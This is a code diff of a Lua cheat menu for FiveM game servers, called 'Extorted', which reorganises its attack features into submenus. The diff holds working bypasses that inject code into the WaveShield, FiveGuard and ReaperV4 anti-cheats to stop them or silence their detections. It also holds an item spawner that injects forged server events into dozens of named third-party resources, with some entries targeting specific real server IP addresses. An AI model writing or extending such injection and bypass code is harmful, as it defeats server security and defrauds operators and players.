@@ -900,136 +900,586 @@ table.insert(activeMenu, {
     type = 'submenu',
     icon = 'ph-skull',
     submenu = {
-
-        { 
-            label = 'WaveSheild Bypass',
-            type = 'button',
-            onConfirm = function()
-                if GetResourceState("WaveShield") == 'started' then
-                    for i = 1, 2 do
-                        MachoInjectResource2(3, 'WaveShield', [[
-                            error('An unexpected error occurred.')
-                        ]])
+        {
+            label = 'Bypasses',
+            type = 'submenu',
+            icon = 'ph-shield-minus',
+            submenu = {
+                { 
+                    label = 'WaveSheild Bypass',
+                    type = 'button',
+                    onConfirm = function()
+                        if GetResourceState("WaveShield") == 'started' then
+                            for i = 1, 2 do
+                                MachoInjectResource2(3, 'WaveShield', [[
+                                    error('An unexpected error occurred.')
+                                ]])
+                            end
+                        else
+                            print("WaveShield Not Found")
+                        end
                     end
-                else
-                    print("WaveShield Not Found")
-                end
-            end
+                },
+                {
+                    label = 'FiveGuard Bypass',
+                    type = 'button',
+                    onConfirm = function()
+                        local found_any = false
+                        for i = 0, GetNumResources() - 1 do
+                            local resource = GetResourceByFindIndex(i)
+                            if resource and GetResourceState(resource) == "started" then
+                                local files = GetNumResourceMetadata(resource, "client_script")
+                                local foundFiveGuard = false
+                                for j = 0, files - 1 do
+                                    local metadata = GetResourceMetadata(resource, "client_script", j)
+                                    if metadata and string.find(metadata, "obfuscated") then
+                                        print("^7[Extorted]: Detected FiveGuard in Resource: " .. resource)
+                                        foundFiveGuard = true
+                                        break
+                                    end
+                                end
+                                if foundFiveGuard then
+                                    MachoResourceStop(resource)
+                                    print("^7[Extorted]: Stopped Resource: " .. resource)
+                                    found_any = true
+                                    return resource
+                                end
+                            end
+                        end
+                        if not found_any then
+                            print("FiveGuard Not Found")
+                        end
+                        return nil
+                    end
+                },
+                { 
+                    label = 'Reaper Bypass',
+                    type = 'button',
+                    onConfirm = function()
+                        if GetResourceState("ReaperV4") == 'started' then
+                            print("ReaperV4 Disabler")
+                            MachoInjectResource2(2, "ReaperV4", [[
+                                pcall(function()
+                                    local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
+                                    local eventHandlers = {}
+
+                                    for name, raw in pairs(eventHandlersRaw) do
+                                        if raw.handlers then
+                                            for id, v in pairs(raw.handlers) do
+                                                table.insert(eventHandlers,
+                                                    {
+                                                        handle = {
+                                                            ['key'] = id,
+                                                            ['name'] = name
+                                                        },
+                                                        func = v,
+                                                        type = (string.find(name, "__cfx_nui") and "NUICallback") or
+                                                            (string.find(name, "__cfx_export") and "Export") or "Event"
+                                                    })
+                                            end
+                                        end
+                                    end
+
+                                    local reaper_newdetection
+                                    for i, v in pairs(eventHandlers) do
+                                        local name = v["handle"]["name"];
+                                        local func = v["func"]
+
+                                        if name == "Reaper:NewDetection" then
+                                            reaper_newdetection = func
+                                        end
+                                    end
+
+                                    if type(reaper_newdetection) ~= "function" then return print("error") end
+
+                                    local _, securityclient = debug.getupvalue(reaper_newdetection, 1);
+
+                                    for name, detection in pairs(securityclient["detections"]) do
+                                        if detection["detected"] then
+                                            securityclient["detections"][name]["detected"] = function(...)
+                                                local args = { ... }
+                                                print(name, "detected", json.encode(args or {}))
+                                                return
+                                            end
+                                        end
+
+                                        if detection["callback"] then
+                                            securityclient["detections"][name]["callback"] = function(...)
+                                                local args = { ... }
+                                                print(name, "callback", json.encode(args or {}))
+                                                return
+                                            end
+                                        end
+                                    end
+
+                                    for name, detection in pairs(securityclient["active_detections"]) do
+                                        if detection["detected"] then
+                                            securityclient["active_detections"][name]["detected"] = function(...)
+                                                return
+                                            end
+                                        end
+
+                                        if detection["callback"] then
+                                            securityclient["active_detections"][name]["callback"] = function(...)
+                                                return
+                                            end
+                                        end
+                                    end
+
+                                    Debug.setupvalue(reaper_newdetection, 1, securityclient)
+                                    print("ReaperV4 | Bypass Enabled")
+                                end)
+                            ]])
+                        else
+                            print("Reaper V4 Not Found")
+                        end
+                    end
+                },
+                {
+                    label = 'Anti Cheat Checker',
+                    type = 'button',
+                    onConfirm = function()
+                        local detectedAC = {}   -- table for storing found anticheats
+
+                        -- Helper function
+                        local function isResourceRunning(name)
+                            return GetResourceState(name) == "started"
+                        end
+
+                        ----------------------------------------------------
+                        -- 1. CHECK IF ANY KNOWN ANTICHEAT IS RUNNING
+                        ----------------------------------------------------
+                        local knownAC = {
+                            "WaveShield",
+                            "ReaperV4",
+                            "ElectronAC",
+                            "FiniAC",
+                            "FiveGuard"
+                        }
+
+                        for _, ac in ipairs(knownAC) do
+                            if isResourceRunning(ac) then
+                                table.insert(detectedAC, ac)
+                                print("^7[Extorted]: Detected Anti-Cheat: " .. ac)
+                            end
+                        end
+
+                        ----------------------------------------------------
+                        -- 2. SCAN ALL RESOURCES FOR FIVEGUARD (obfuscated)
+                        ----------------------------------------------------
+                        for i = 0, GetNumResources() - 1 do
+                            local resource = GetResourceByFindIndex(i)
+
+                            if resource and GetResourceState(resource) == "started" then
+                                local files = GetNumResourceMetadata(resource, "client_script")
+
+                                for j = 0, files - 1 do
+                                    local metadata = GetResourceMetadata(resource, "client_script", j)
+
+                                    if metadata and string.find(metadata, "obfuscated") then
+                                        print("^7[Extorted]: Detected FiveGuard (obfuscated script) in resource: " .. resource)
+
+                                        if not detectedAC["FiveGuard"] then
+                                            table.insert(detectedAC, "FiveGuard")
+                                        end
+
+                                        break
+                                    end
+                                end
+                            end
+                        end
+
+                        ----------------------------------------------------
+                        -- 3. FINAL PRINT RESULT
+                        ----------------------------------------------------
+                        if #detectedAC == 0 then
+                            print("^7[Extorted]: No Anti-Cheat Detected.")
+                        else
+                            print("^7[Extorted]: Total Anti-Cheats Detected: " .. #detectedAC)
+                        end
+
+                    end
+                }
+            }
         },
         {
-            label = 'FiveGuard Bypass',
-            type = 'button',
-            onConfirm = function()
-                local found_any = false
-                for i = 0, GetNumResources() - 1 do
-                    local resource = GetResourceByFindIndex(i)
-                    if resource and GetResourceState(resource) == "started" then
-                        local files = GetNumResourceMetadata(resource, "client_script")
-                        local foundFiveGuard = false
-                        for j = 0, files - 1 do
-                            local metadata = GetResourceMetadata(resource, "client_script", j)
-                            if metadata and string.find(metadata, "obfuscated") then
-                                print("^7[Extorted]: Detected FiveGuard in Resource: " .. resource)
-                                foundFiveGuard = true
-                                break
+            label = 'Item Spawner',
+            type = 'submenu',
+            icon = 'ph-box',
+            submenu = {
+                {
+                    label = 'Spawn Items',
+                    type = 'button',
+                    onConfirm = function()
+                        local input = GetUserInput("Enter Item Name", lastItemName)
+                        if input and input ~= "" then
+                            lastItemName = input
+                            -- Now get amount
+                            local amountInput = GetUserInput("Enter Amount", tostring(lastAmount))
+                            local amount = tonumber(amountInput) or 1
+                            lastAmount = amount
+
+                            local ItemName = lastItemName
+                            local ItemAmount = lastAmount
+
+                            if ItemName and ItemAmount and tostring(ItemName) ~= "" and tonumber(ItemAmount) > 0 then
+                                local resourceActions = {
+
+                                    ["ak47_drugmanagerv2"] = function()
+                                        TriggerServerEvent("ak47_drugmanagerv2:shop:buy",
+                                            "69.420 CodePlug",
+                                            {
+                                                buyprice = 0,
+                                                currency = "cash",
+                                                label = "codeplug",
+                                                name = ItemName,
+                                                sellprice = 0
+                                            },
+                                            ItemAmount
+                                        )
+                                    end,
+
+                                    ["xmmx_letscookplus"] = function()
+                                        TriggerServerEvent("xmmx_letscookplus:shop:buy",
+                                            "69.420 CodePlug",
+                                            {
+                                                buyprice = 0,
+                                                currency = "cash",
+                                                label = "codeplug",
+                                                name = ItemName,
+                                                sellprice = 0
+                                            },
+                                            ItemAmount
+                                        )
+                                    end,
+
+                                    ["ak47_drugmanager"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('ak47_drugmanager:pickedupitem', "%s", "%s", %d)
+                                        ]], ItemName, ItemName, ItemAmount))
+                                    end,
+
+                                    ["bobi-selldrugs"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["core"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('Core:triggerServerCallback', "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["mc9-taco"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('mc9-taco:server:addItem', "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["wp-pocketbikes"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("wp-pocketbikes:server:AddItem", "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["solos-jointroll"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('solos-joints:server:itemadd', "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["angelicxs-CivilianJobs"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["ars_whitewidow_v2"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
+                                                items = {
+                                                    {
+                                                        id = "%s",
+                                                        image = "Rain",
+                                                        name = "Rain",
+                                                        page = 1,
+                                                        price = 500,
+                                                        quantity = %d,
+                                                        stock = 999999999999999999999999999,
+                                                        totalPrice = 0
+                                                    }
+                                                },
+                                                method = "cash",
+                                                total = 0
+                                            }, "cash")
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["ars_cannabisstore_v2"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
+                                                items = {
+                                                    {
+                                                        id = "%s",
+                                                        image = "Rain",
+                                                        name = "Rain",
+                                                        page = 1,
+                                                        price = 0,
+                                                        quantity = %d,
+                                                        stock = 999999999,
+                                                        totalPrice = 0
+                                                    }
+                                                },
+                                                method = "cash",
+                                                total = 0
+                                            }, "cash")
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["ars_hunting"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("ars_hunting:sellBuyItem",  {
+                                                item = "%s",
+                                                price = 1,
+                                                quantity = %d,
+                                                buy = true
+                                            })
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["boii-whitewidow"] = function()
+                                        local ServerIP = { "217.20.242.24:30120" }
+                                        local function IsAllowedIP(CurrentIP)
+                                            for _, ip in ipairs(ServerIP) do
+                                                if CurrentIP == ip then return true end
+                                            end
+                                            return false
+                                        end
+                                        local CurrentIP = GetCurrentServerEndpoint()
+                                        if IsAllowedIP(CurrentIP) then
+                                            MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                                TriggerServerEvent('boii-whitewidow:server:AddItem', '%s', %d)
+                                            ]], ItemName, ItemAmount))
+                                        end
+                                    end,
+
+                                    ["codewave-cannabis-cafe"] = function()
+                                        local ServerIP = { "185.244.106.45:30120" }
+                                        local function IsAllowedIP(CurrentIP)
+                                            for _, ip in ipairs(ServerIP) do
+                                                if CurrentIP == ip then return true end
+                                            end
+                                            return false
+                                        end
+                                        local CurrentIP = GetCurrentServerEndpoint()
+                                        if IsAllowedIP(CurrentIP) then
+                                            MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                                TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "%s", newItem = "Rain", pricePerItem = 0 }, %d)
+                                            ]], ItemName, ItemAmount))
+                                        end
+                                    end,
+
+                                    ["snipe-boombox"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s")
+                                        ]], ItemAmount, ItemName))
+                                    end,
+
+                                    ["devkit_bbq"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('devkit_bbq:addinv', '%s', %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["mt_printers"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:Rain", "%s", "add")
+                                        ]], ItemName))
+                                    end,
+
+                                    ["WayTooCerti_3D_Printer"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', '%s', %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["pug-fishing"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent('Pug:server:GiveFish', "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["apex_koi"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("apex_koi:client:addItem", "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["apex_peckerwood"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("apex_peckerwood:client:addItem", "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["apex_thetown"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("apex_thetown:client:addItem", "%s", %d)
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["codewave-bbq"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            for i = 1, %d do
+                                                TriggerServerEvent('placeProp:returnItem', "%s")
+                                                Wait(1)
+                                            end
+                                        ]], ItemAmount, ItemName))
+                                    end,
+
+                                    ["brutal_hunting"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            Wait(1)
+                                            TriggerServerEvent("brutal_hunting:server:AddItem", {
+                                                {
+                                                    amount = %d,
+                                                    item = "%s",
+                                                    label = "Rain",
+                                                    price = 0
+                                                }
+                                            })
+                                        ]], ItemAmount, ItemName))
+                                    end,
+
+                                    ["xmmx_bahamas"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            TriggerServerEvent("xmmx-bahamas:Making:GetItem", "%s", {
+                                                amount = %d,
+                                                cash = { }
+                                            })
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["xmmx_letscookplus_v2"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            Wait(1)
+                                            TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
+                                                totalCost = 0,
+                                                cart = {
+                                                    {name = "%s", quantity = %d}
+                                                }
+                                            }, "bank")
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["xmmx-letscamp"] = function()
+                                        local BlockedIPs = { "66.70.153.70:80" }
+                                        local function IsBlockedIP(CurrentIP)
+                                            for _, ip in ipairs(BlockedIPs) do
+                                                if CurrentIP == ip then return true end
+                                            end
+                                            return false
+                                        end
+                                        local CurrentIP = GetCurrentServerEndpoint()
+                                        if not IsBlockedIP(CurrentIP) then
+                                            local code = string.format([[ 
+                                                Wait(1)
+                                                TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', '%s', {
+                                                    ['%s'] = {
+                                                        ['lccampherbs'] = 0,
+                                                        ['lccampmeat'] = 0,
+                                                        ['lccampbutta'] = 0
+                                                    },
+                                                    ['amount'] = %d
+                                                })
+                                            ]], ItemName, ItemName, ItemAmount)
+                                            MachoInjectResource2(3, "xmmx-letscamp", code)
+                                        end
+                                    end,
+
+                                    ["wasabi_mining"] = function()
+                                        MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                            local item = {
+                                                difficulty = { "medium", "medium" },
+                                                item = "%s",
+                                                label = "Rain",
+                                                price = { 110, 140 }
+                                            }
+                                            local index = 3
+                                            for i = 1, %d do
+                                                Wait(1)
+                                                TriggerServerEvent('wasabi_mining:mineRock', item, index)
+                                            end
+                                        ]], ItemName, ItemAmount))
+                                    end,
+
+                                    ["apex_bahama"] = function()
+                                        local ServerIP = { "89.31.216.161:30120" }
+                                        local function IsAllowedIP(CurrentIP)
+                                            for _, ip in ipairs(ServerIP) do
+                                                if CurrentIP == ip then return true end
+                                            end
+                                            return false
+                                        end
+                                        local CurrentIP = GetCurrentServerEndpoint()
+                                        if IsAllowedIP(CurrentIP) then
+                                            MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                                Wait(1)
+                                                TriggerServerEvent("apex_bahama:client:addItem", "%s", %d)
+                                            ]], ItemName, ItemAmount))
+                                        end
+                                    end,
+
+                                    ["jg-mechanic"] = function()
+                                        local ServerIP = { "91.190.154.43:30120" }
+                                        local function IsAllowedIP(CurrentIP)
+                                            for _, ip in ipairs(ServerIP) do
+                                                if CurrentIP == ip then return true end
+                                            end
+                                            return false
+                                        end
+                                        local CurrentIP = GetCurrentServerEndpoint()
+                                        if IsAllowedIP(CurrentIP) then
+                                            MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                                Wait(1)
+                                                TriggerServerEvent('jg-mechanic:server:buy-item', "%s", 0, %d, "autoexotic", 1)
+                                            ]], ItemName, ItemAmount))
+                                        end
+                                    end,
+
+                                    ["jg-mechanic-shiesty"] = function()
+                                        local ServerIP = { "191.96.152.17:30121" }
+                                        local function IsAllowedIP(CurrentIP)
+                                            for _, ip in ipairs(ServerIP) do
+                                                if CurrentIP == ip then return true end
+                                            end
+                                            return false
+                                        end
+                                        local CurrentIP = GetCurrentServerEndpoint()
+                                        if IsAllowedIP(CurrentIP) then
+                                            MachoInjectResource2(3, GetFallbackResource(), string.format([[
+                                                Wait(1)
+                                                TriggerServerEvent('jg-mechanic:server:buy-item', "%s", 0, %d, "TheCultMechShop", 1)
+                                            ]], ItemName, ItemAmount))
+                                        end
+                                    end,
+
+                                }
+
+                                local ranAny = RunAllActiveResourceActions(resourceActions)
+                                if not ranAny then
+                                    MachoMenuNotification("[NOTIFICATION] Extorted", "No Triggers Found.")
+                                end
+
+                            else
+                                MachoMenuNotification("[NOTIFICATION] Extorted", "Invalid Item or Amount.")
                             end
-                        end
-                        if foundFiveGuard then
-                            MachoResourceStop(resource)
-                            print("^7[Extorted]: Stopped Resource: " .. resource)
-                            found_any = true
-                            return resource
+                        else
+                            MachoMenuNotification("[NOTIFICATION] Extorted", "Invalid item name!")
                         end
                     end
-                end
-                if not found_any then
-                    print("FiveGuard Not Found")
-                end
-                return nil
-            end
-        },
-        { 
-            label = 'Reaper Bypass',
-            type = 'button',
-            onConfirm = function()
-                if GetResourceState("ReaperV4") == 'started' then
-                    print("ReaperV4 Disabler")
-                    MachoInjectResource2(2, "ReaperV4", [[
-                        pcall(function()
-                            local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
-                            local eventHandlers = {}
-
-                            for name, raw in pairs(eventHandlersRaw) do
-                                if raw.handlers then
-                                    for id, v in pairs(raw.handlers) do
-                                        table.insert(eventHandlers,
-                                            {
-                                                handle = {
-                                                    ['key'] = id,
-                                                    ['name'] = name
-                                                },
-                                                func = v,
-                                                type = (string.find(name, "__cfx_nui") and "NUICallback") or
-                                                    (string.find(name, "__cfx_export") and "Export") or "Event"
-                                            })
-                                    end
-                                end
-                            end
-
-                            local reaper_newdetection
-                            for i, v in pairs(eventHandlers) do
-                                local name = v["handle"]["name"];
-                                local func = v["func"]
-
-                                if name == "Reaper:NewDetection" then
-                                    reaper_newdetection = func
-                                end
-                            end
-
-                            if type(reaper_newdetection) ~= "function" then return print("error") end
-
-                            local _, securityclient = debug.getupvalue(reaper_newdetection, 1);
-
-                            for name, detection in pairs(securityclient["detections"]) do
-                                if detection["detected"] then
-                                    securityclient["detections"][name]["detected"] = function(...)
-                                        local args = { ... }
-                                        print(name, "detected", json.encode(args or {}))
-                                        return
-                                    end
-                                end
-
-                                if detection["callback"] then
-                                    securityclient["detections"][name]["callback"] = function(...)
-                                        local args = { ... }
-                                        print(name, "callback", json.encode(args or {}))
-                                        return
-                                    end
-                                end
-                            end
-
-                            for name, detection in pairs(securityclient["active_detections"]) do
-                                if detection["detected"] then
-                                    securityclient["active_detections"][name]["detected"] = function(...)
-                                        return
-                                    end
-                                end
-
-                                if detection["callback"] then
-                                    securityclient["active_detections"][name]["callback"] = function(...)
-                                        return
-                                    end
-                                end
-                            end
-
-                            Debug.setupvalue(reaper_newdetection, 1, securityclient)
-                            print("ReaperV4 | Bypass Enabled")
-                        end)
-                    ]])
-                else
-                    print("Reaper V4 Not Found")
-                end
-            end
+                }
+            }
         },
         {
             label = 'Tx Admin Nametags',
@@ -1046,443 +1496,6 @@ table.insert(activeMenu, {
                         menuIsAccessible = false
                         toggleShowPlayerIDs(false, false)
                     ]])
-                end
-            end
-        },
-        {
-            label = 'Anti Cheat Checker',
-            type = 'button',
-            onConfirm = function()
-                local detectedAC = {}   -- table for storing found anticheats
-
-                -- Helper function
-                local function isResourceRunning(name)
-                    return GetResourceState(name) == "started"
-                end
-
-                ----------------------------------------------------
-                -- 1. CHECK IF ANY KNOWN ANTICHEAT IS RUNNING
-                ----------------------------------------------------
-                local knownAC = {
-                    "WaveShield",
-                    "ReaperV4",
-                    "ElectronAC",
-                    "FiniAC",
-                    "FiveGuard"
-                }
-
-                for _, ac in ipairs(knownAC) do
-                    if isResourceRunning(ac) then
-                        table.insert(detectedAC, ac)
-                        print("^7[Extorted]: Detected Anti-Cheat: " .. ac)
-                    end
-                end
-
-                ----------------------------------------------------
-                -- 2. SCAN ALL RESOURCES FOR FIVEGUARD (obfuscated)
-                ----------------------------------------------------
-                for i = 0, GetNumResources() - 1 do
-                    local resource = GetResourceByFindIndex(i)
-
-                    if resource and GetResourceState(resource) == "started" then
-                        local files = GetNumResourceMetadata(resource, "client_script")
-
-                        for j = 0, files - 1 do
-                            local metadata = GetResourceMetadata(resource, "client_script", j)
-
-                            if metadata and string.find(metadata, "obfuscated") then
-                                print("^7[Extorted]: Detected FiveGuard (obfuscated script) in resource: " .. resource)
-
-                                if not detectedAC["FiveGuard"] then
-                                    table.insert(detectedAC, "FiveGuard")
-                                end
-
-                                break
-                            end
-                        end
-                    end
-                end
-
-                ----------------------------------------------------
-                -- 3. FINAL PRINT RESULT
-                ----------------------------------------------------
-                if #detectedAC == 0 then
-                    print("^7[Extorted]: No Anti-Cheat Detected.")
-                else
-                    print("^7[Extorted]: Total Anti-Cheats Detected: " .. #detectedAC)
-                end
-
-            end
-        },
-        {
-            label = 'Item Spawner',
-            type = 'button',
-            onConfirm = function()
-                local input = GetUserInput("Enter Item Name", lastItemName)
-                if input and input ~= "" then
-                    lastItemName = input
-                    -- Now get amount
-                    local amountInput = GetUserInput("Enter Amount", tostring(lastAmount))
-                    local amount = tonumber(amountInput) or 1
-                    lastAmount = amount
-
-                    local ItemName = lastItemName
-                    local ItemAmount = lastAmount
-
-                    if ItemName and ItemAmount and tostring(ItemName) ~= "" and tonumber(ItemAmount) > 0 then
-                        local resourceActions = {
-
-                            ["ak47_drugmanagerv2"] = function()
-                                TriggerServerEvent("ak47_drugmanagerv2:shop:buy",
-                                    "69.420 CodePlug",
-                                    {
-                                        buyprice = 0,
-                                        currency = "cash",
-                                        label = "codeplug",
-                                        name = ItemName,
-                                        sellprice = 0
-                                    },
-                                    ItemAmount
-                                )
-                            end,
-
-                            ["xmmx_letscookplus"] = function()
-                                TriggerServerEvent("xmmx_letscookplus:shop:buy",
-                                    "69.420 CodePlug",
-                                    {
-                                        buyprice = 0,
-                                        currency = "cash",
-                                        label = "codeplug",
-                                        name = ItemName,
-                                        sellprice = 0
-                                    },
-                                    ItemAmount
-                                )
-                            end,
-
-                            ["ak47_drugmanager"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('ak47_drugmanager:pickedupitem', "%s", "%s", %d)
-                                ]], ItemName, ItemName, ItemAmount))
-                            end,
-
-                            ["bobi-selldrugs"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["core"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('Core:triggerServerCallback', "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["mc9-taco"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('mc9-taco:server:addItem', "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["wp-pocketbikes"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("wp-pocketbikes:server:AddItem", "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["solos-jointroll"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('solos-joints:server:itemadd', "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["angelicxs-CivilianJobs"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["ars_whitewidow_v2"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
-                                        items = {
-                                            {
-                                                id = "%s",
-                                                image = "Rain",
-                                                name = "Rain",
-                                                page = 1,
-                                                price = 500,
-                                                quantity = %d,
-                                                stock = 999999999999999999999999999,
-                                                totalPrice = 0
-                                            }
-                                        },
-                                        method = "cash",
-                                        total = 0
-                                    }, "cash")
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["ars_cannabisstore_v2"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
-                                        items = {
-                                            {
-                                                id = "%s",
-                                                image = "Rain",
-                                                name = "Rain",
-                                                page = 1,
-                                                price = 0,
-                                                quantity = %d,
-                                                stock = 999999999,
-                                                totalPrice = 0
-                                            }
-                                        },
-                                        method = "cash",
-                                        total = 0
-                                    }, "cash")
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["ars_hunting"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("ars_hunting:sellBuyItem",  {
-                                        item = "%s",
-                                        price = 1,
-                                        quantity = %d,
-                                        buy = true
-                                    })
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["boii-whitewidow"] = function()
-                                local ServerIP = { "217.20.242.24:30120" }
-                                local function IsAllowedIP(CurrentIP)
-                                    for _, ip in ipairs(ServerIP) do
-                                        if CurrentIP == ip then return true end
-                                    end
-                                    return false
-                                end
-                                local CurrentIP = GetCurrentServerEndpoint()
-                                if IsAllowedIP(CurrentIP) then
-                                    MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                        TriggerServerEvent('boii-whitewidow:server:AddItem', '%s', %d)
-                                    ]], ItemName, ItemAmount))
-                                end
-                            end,
-
-                            ["codewave-cannabis-cafe"] = function()
-                                local ServerIP = { "185.244.106.45:30120" }
-                                local function IsAllowedIP(CurrentIP)
-                                    for _, ip in ipairs(ServerIP) do
-                                        if CurrentIP == ip then return true end
-                                    end
-                                    return false
-                                end
-                                local CurrentIP = GetCurrentServerEndpoint()
-                                if IsAllowedIP(CurrentIP) then
-                                    MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                        TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "%s", newItem = "Rain", pricePerItem = 0 }, %d)
-                                    ]], ItemName, ItemAmount))
-                                end
-                            end,
-
-                            ["snipe-boombox"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s")
-                                ]], ItemAmount, ItemName))
-                            end,
-
-                            ["devkit_bbq"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('devkit_bbq:addinv', '%s', %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["mt_printers"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:Rain", "%s", "add")
-                                ]], ItemName))
-                            end,
-
-                            ["WayTooCerti_3D_Printer"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', '%s', %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["pug-fishing"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent('Pug:server:GiveFish', "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["apex_koi"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("apex_koi:client:addItem", "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["apex_peckerwood"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
